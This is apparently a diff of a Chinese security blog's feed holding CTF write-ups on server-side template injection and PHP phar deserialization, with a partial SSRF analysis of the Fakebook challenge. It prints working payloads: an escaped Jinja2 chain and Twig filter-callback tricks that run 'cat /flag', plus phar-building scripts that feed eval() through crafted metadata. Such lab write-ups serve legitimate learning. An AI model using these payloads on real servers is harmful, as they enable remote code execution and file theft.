+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span>(lipsum|attr(<span class="string">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(<span class="string">&quot;\u006f\u0073&quot;</span>)|attr(<span class="string">&quot;\u0070\u006f\u0070\u0065\u006e&quot;</span>)(<span class="string">&quot;\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067&quot;</span>)|attr(<span class="string">&quot;\u0072\u0065\u0061\u0064&quot;</span>)())%&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Twig-模板注入"><a href="#Twig-模板注入" class="headerlink" title="Twig 模板注入"></a>Twig 模板注入</h2><p>​	有两种形式的分隔符：<code>&#123;&#123; ... &#125;&#125;</code> 和 <code>&#123;% ... %&#125;</code>。前者用于执行语句，例如 <code>for</code> 循环，后者用于将表达式的结果输出到模板中。</p>
+<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><figure class="highlight twig"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">for</span> i <span class="keyword">in</span> <span class="name">range</span>(<span class="number">0</span>,<span class="number">3</span>) <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123; i &#125;&#125;</span><span class="language-xml">,</span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endfor</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">// 会输出:0,1,2,3</span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">for</span> i <span class="keyword">in</span> <span class="name">range</span>(<span class="number">0</span>,<span class="number">3</span>) <span class="template-tag">%&#125;</span><span class="template-variable">&#123;&#123; i &#125;&#125;</span><span class="language-xml"> </span><span class="template-tag">&#123;%</span> <span class="name">endfor</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">// 会输出:0 1 2 3</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a><code>payload</code></h3><p>对于<code>twig</code>模板注入，目前只知道有一些固定的<code>payload</code></p>
+<figure class="highlight twig"><table><tr><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;</span><span class="template-variable">&#123;&#123;_self.env.getFilter(<span class="string">&quot;cat /flag&quot;</span>)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">//查看flag</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>web安全</tag>
+        <tag>SSTI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>phar反序列化学习总结</title>
+    <url>/2024/12/10/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<p>Phar反序列化漏洞是PHP中的一种安全漏洞，与PHP的Phar扩展和对象反序列化机制有关。Phar扩展允许将多个文件打包成一个单一的Phar归档文件，类似于ZIP或TAR。当Phar归档文件被加载时，PHP会自动反序列化其中的元数据。如果攻击者能够控制Phar归档文件的内容，他们可以构造恶意的元数据，使其在反序列化时触发任意代码执行。这种漏洞通常发生在应用程序对用户上传的文件处理不当，允许攻击者上传并加载恶意的Phar文件时。</p>
+<span id="more"></span>
+
+<h2 id="前提知识"><a href="#前提知识" class="headerlink" title="前提知识"></a>前提知识</h2><p>怎么构造<code>pop</code>链：</p>
+<p>​	序列化后，类便会被重构，我们可以通过，<strong>覆盖类中的属性变量，来触发魔术方法</strong>，进而执行危险方法或函数。</p>
+<h3 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a><code>phar</code>文件结构</h3><p><code>phar</code>文件主要由四部分组成</p>
+<ul>
+<li><strong>a stub</strong></li>
+</ul>
+<p>格式为：<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>。要求是必须以**<code>__HALT_COMPILER();?&gt;</code>**结尾，否则<code>phar</code>拓展将无法识别这个文件为<code>phar</code>文件。</p>
+<ul>
+<li><strong>a manifest describing the contents</strong></li>
+</ul>
+<p><code>phar</code>文件中被压缩的文件的一些信息，其中<code>Meta-data</code>部分的信息会以序列化的形式储存，这里是漏洞利用的关键点。</p>
+<ul>
+<li><strong>the file contents</strong></li>
+</ul>
+<p>被压缩的文件的内容。</p>
+<ul>
+<li><strong>a signature for verifying Phar integrity</strong></li>
+</ul>
+<p>签名，放在文件末尾，格式如下：</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102039889.png" alt="image-20250112164001940" style="zoom: 50%;" />
+
+<p>​	<strong>注意：需要修改<code>php.ini</code>文件中的<code>phar.readonly = On</code>为<code>phar.readonly = Off</code>，才能成功生成<code>.phar</code>文件。</strong></p>
+<p>一个简单的例子</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);   <span class="comment">//后缀名必须是phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);   <span class="comment">//设置stub</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line"><span class="variable">$t</span>-&gt;data = <span class="string">&quot;meta_data&quot;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$t</span>);   <span class="comment">//将自定义的meta-data($t) 存入manifest</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;xxx&quot;</span>);   <span class="comment">//添加要压缩的文件，随便写</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();   <span class="comment">//签名自动计算</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>​	运行代码，会在同目录下生成一个<code>phar.phar</code>文件，其内容如下，可以看到<code>meta-data</code>是以序列化的形式存储的。</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102040034.png" alt="image-20250112180250240" style="zoom:67%;" />
+
+<p>​	<code>php</code>大部分的文件系统函数，在参数可控的情况下，通过<code>phar://</code>伪协议解析<code>phar</code>文件时，都会将<code>meta-data</code>进行反序列化。如下：</p>
+<p>进行反序列化操作</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;phar://phar.phar&#x27;</span>);</span><br><span class="line"><span class="comment">// echo file_get_contents(&quot;phar.phar&quot;);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="利用前提条件"><a href="#利用前提条件" class="headerlink" title="利用前提条件"></a>利用前提条件</h3><p>先简单说一下<code>phar</code>反序列化漏洞能够利用的基本前提：</p>
+<ul>
+<li><code>phar</code>文件能够上传到服务器</li>
+<li>要有可利用的魔术方法，来触发反序列化</li>
+<li>文件操作函数的参数可控，且：<code>/</code>、<code>phar</code>字符没有被过滤</li>
+</ul>
+<h2 id="ctf实战练习"><a href="#ctf实战练习" class="headerlink" title="ctf实战练习"></a><code>ctf</code>实战练习</h2><h3 id="1-CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#1-CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="1.[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a><code>1.[CISCN2019 华北赛区 Day1 Web1]Dropbox</code></h3><h3 id="2-SWPUCTF-2018-SimplePHP"><a href="#2-SWPUCTF-2018-SimplePHP" class="headerlink" title="2.[SWPUCTF 2018]SimplePHP"></a><code>2.[SWPUCTF 2018]SimplePHP</code></h3><p>怎么构造<code>pop</code>链：</p>
+<p>​	序列化后，类便会被重构，我们可以通过，<strong>覆盖类中的属性变量，来触发魔术方法</strong>，进而执行危险方法或函数。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">C1e4r</span>();</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$p</span>-&gt;str = <span class="variable">$s</span>;</span><br><span class="line"><span class="variable">$s</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>] = <span class="variable">$t</span>;</span><br><span class="line"><span class="variable">$t</span>-&gt;params[<span class="string">&#x27;source&#x27;</span>] = <span class="string">&quot;/var/www/html/f1ag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;s.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$p</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;aaaaa&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-GXYCTF2019-BabysqliV3-0"><a href="#3-GXYCTF2019-BabysqliV3-0" class="headerlink" title="3.[GXYCTF2019]BabysqliV3.0"></a><code>3.[GXYCTF2019]BabysqliV3.0</code></h3><h4 id="分析upload-php源码"><a href="#分析upload-php源码" class="headerlink" title="分析upload.php源码"></a>分析<code>upload.php</code>源码</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$Filename</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># function __construct();</span></span><br><span class="line"><span class="comment"># function __toString();</span></span><br><span class="line"><span class="comment"># function __destruct();</span></span><br><span class="line"><span class="comment"># function upload($file);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$uploader</span> = <span class="keyword">new</span> <span class="title class_">Uploader</span>();   <span class="comment">#接着调用__construct函数</span></span><br><span class="line">	<span class="variable">$uploader</span>-&gt;<span class="title function_ invoke__">upload</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]);   <span class="comment">#会调用upload方法,$file=$_FILES[&quot;file&quot;]</span></span><br><span class="line">	<span class="keyword">if</span>(@<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploader</span>))   <span class="comment">#执行这一步前，会自行调用__destruct函数</span></span><br><span class="line">	&#123;   <span class="comment">#接着这里会触发__toString()函数</span></span><br><span class="line">	    <span class="keyword">echo</span> <span class="string">&quot;下面是你上传的文件：&lt;br&gt;&quot;</span>.<span class="variable">$uploader</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploader</span>);   </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>实例化一个类的对象后，会自发调用<code>__construct()</code>构造函数。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)   #构造函数。它在创建类的新对象时自动调用</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="title function_ invoke__">getcwd</span>().<span class="string">&quot;/uploads/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]).<span class="string">&quot;/&quot;</span>;</span><br><span class="line">	<span class="variable">$ext</span> = <span class="string">&quot;.txt&quot;</span>;</span><br><span class="line">	@<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line">	&#123;</span><br><span class="line">	    <span class="variable language_">$this</span>-&gt;Filename = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];   <span class="comment">#需要执行这一步</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	    <span class="variable language_">$this</span>-&gt;Filename = <span class="variable">$sandbox</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>].<span class="variable">$ext</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;</span>;</span><br><span class="line">	<span class="variable language_">$this</span>-&gt;token = <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后会调用<code>upload($file)</code>方法，下面的<code>[^a-z0-9]</code>表示，匹配任何非小写字母或非数字的符号。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$file</span></span>)   #<span class="title">file</span> = $<span class="title">_FILES</span>[&quot;<span class="title">file</span>&quot;]</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$sandbox</span>;   <span class="comment">#当前目录/uploads/md5($_SESSION[&#x27;user&#x27;])/</span></span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$ext</span>;   <span class="comment">#.txt</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;[^a-z0-9]&quot;</span>, <span class="variable">$this</span>-&gt;Filename))</span><br><span class="line">	&#123;</span><br><span class="line">	    <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>   <span class="comment">#需要进入else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>)</span><br><span class="line">		    <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;you are too big (′▽`〃)&#x27;);&quot;</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		    <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;move_uploaded_file(&#x27;&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span> . <span class="variable language_">$this</span>-&gt;Filename . <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;   <span class="comment">#设置了this-&gt;cmd = move_uploaded_file(&#x27;xx&#x27;, &#x27;xxx&#x27;);</span></span><br></pre></td></tr></table></figure>
+
+<p>上面最后一行代码看起来比较乱，其实就是利用<code>.</code>连接了五个部分，下面我框出了要连接的内容。</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102040050.png" alt="QQ_1727423925626"></p>
+<p>如果其中，<code>$file[&#39;tmp_name&#39;]=tmp_name</code>、<code>$this-&gt;Filename=filename</code>，那么连接起来就是这样的：<code>move_uploaded_file(&#39;tmp_name&#39;, &#39;filename&#39;);</code>。</p>
+<p>而<code>move_uploaded_file()</code>是一个用于将上传的文件，<strong>从临时目录移动到新的路径下</strong>的函数，如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="string">&#x27;临时文件路径&#x27;</span>, <span class="string">&#x27;目标文件路径&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>接下来将随着类的销毁，会自发调用<code>__destruct</code>析构函数。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;token != <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);   <span class="comment">#要绕过if，执行eval()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功绕过<code>if</code>后，便能执行<code>move_uploaded_file($file[&#39;tmp_name&#39;], $this-&gt;Filename);</code>。然后回到主程序流中，即将进行<code>if</code>语句的判断，但此时也触发了<code>__toString()</code>函数。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$sandbox</span>;   </span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$ext</span>;  </span><br><span class="line">	<span class="comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="line">	<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;Filename;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>__toString()</code>执行完后，程序会接着执行<code>echo file_get_contents($this-&gt;Filename);</code>。</p>
+<h4 id="phar反序列化利用思路"><a href="#phar反序列化利用思路" class="headerlink" title="phar反序列化利用思路"></a><code>phar</code>反序列化利用思路</h4><p>​	<code>Uploader</code>类中有一个魔术方法<code>__destruct()</code>，其中我们可以利用<code>eval($this-&gt;cmd)</code>，但是要绕过<code>if</code>语句，否则，<code>$this-&gt;cmd</code>会被重新赋值，那么<code>exp.phar</code>中的对<code>$this-&gt;cmd</code>值便无效了。</p>
+<p>​	而绕过<code>if</code>需要使<code>token</code>等于<code>$_SESSION[&#39;user&#39;]</code>，通过前面对源码的分析及上传文件后的回显可知，<code>$_SESSION[&#39;user&#39;]</code>其实就是回显里的<code>.txt</code>前面的一串字符。</p>
+<p><code>exp.php</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HaHa</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;highlight_file(&#x27;/var/www/html/flag.php&#x27;);&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Filename = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token = <span class="string">&quot;GXY897d924ee25aa61d0373a64ee3e56354&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">HaHa</span>();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;exp.phar&quot;</span>);   <span class="comment">#生成的.phar文件名称</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);   <span class="comment">#固定格式</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$p</span>);   <span class="comment">#传入触发对象</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;phar.txt&quot;</span>,<span class="string">&quot;phar&quot;</span>);   <span class="comment">#随便写点，生成签名</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4><p>随便上传一个文件，点击两次’上传’，得到<code>token</code>。</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102040522.png" alt="image-20240927195911158"></p>
+<p>然后运行<code>exp.php</code>，生成<code>exp.phar</code>文件，上传<code>exp.phar</code>，这里只点击一次’上传’即可。</p>
+<p>再随便上传一个文件，<code>Burp</code>抓包，添加参数<code>name=/var/www/html/flag.php</code>后，发送即可获得<code>flag</code>。</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102040120.png" alt="image-20240927200749703"></p>
+<p>唉，这道题写一天了，也没真正搞清楚，只能先放这儿了。</p>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>web安全</tag>
+        <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>有关反序列化的两道题</title>
+    <url>/2024/11/20/%E4%B8%80%E9%81%93%E9%A2%98%E8%AE%A4%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    <content><![CDATA[<p>题目链接：</p>
+<p><a href="https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Fakebook">[网鼎杯 2018]Fakebook</a></p>
+<p><a href="https://buuoj.cn/challenges#[MRCTF2020]Ezpop">[MRCTF2020]Ezpop</a></p>
+<span id="more"></span>
+
+<h1 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a><code>SSRF</code></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码审计后发现<code>UserInfo</code>类有<code>SSRF</code>漏洞，可以使用<code>file:///var/www/html/flag.php</code>这个<code>payload</code>获取<code>flag</code>（<strong>绝对路径是后面<code>sql</code>注入泄漏出来的</strong>）。但是也会对<code>$this-&gt;blog</code>进行过滤，所以不能在<code>join</code>的时候直接通过<code>blog</code>获得<code>flag</code>。</p>
